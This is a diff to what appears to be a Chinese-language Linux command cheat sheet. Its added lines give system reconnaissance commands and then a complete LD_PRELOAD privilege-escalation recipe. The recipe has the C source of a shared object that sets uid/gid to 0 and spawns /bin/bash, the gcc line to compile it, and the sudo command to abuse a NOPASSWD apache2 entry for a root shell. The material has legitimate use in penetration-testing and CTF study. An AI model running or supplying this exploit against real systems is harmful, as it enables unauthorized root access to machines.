@@ -215,4 +215,29 @@ tmux -S /shareds new -s debugsess      在 /shareds 这个 socket 文件上创�
 chown root:devs /shareds               把 /shareds 的属主改成 root，属组改成 devs
 
 
+uname -a                  查看内核信息
+cat /etc/lsb-release      查发行版本
 
+
+ldd /bin/ls            查看 ls 所需动态库
+利用 LD_PRELOAD 环境变量进行提权：
+  https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html
+
+sudo -l
+  (root) NOPASSWD: /usr/sbin/apache2 restart
+gcc -fPIC -shared -o root.so root.c -nostartfiles            把 root.c 编译成 root.so
+  root.c的内容
+  ————————————
+  #include <stdio.h>
+  #include <sys/types.h>
+  #include <stdlib.h>
+  #include <unistd.h>
+  
+  void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+  }
+  ————————————
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart            获得 root shell
